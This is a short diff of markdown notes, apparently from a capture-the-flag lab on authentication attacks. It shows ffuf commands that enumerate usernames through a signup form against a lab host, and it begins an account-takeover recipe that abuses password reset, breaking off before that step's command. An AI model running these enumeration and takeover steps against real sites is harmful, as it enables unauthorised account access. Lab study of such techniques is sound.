@@ -18,6 +18,7 @@ $ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "us
 * -mr the text on the page we are looking for to validate we've found a valid username.
 
 To save only FUZZ outup in file:
+```
 $ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
 -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" -s | tee output.txt
 ```
@@ -29,6 +30,7 @@ $ ffuf -w output.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentia
 ```
 
 #### Account takeover
+
 1. Create account with email in company domain
 2. Run curl to reset password for other user, using your own email:
 ```
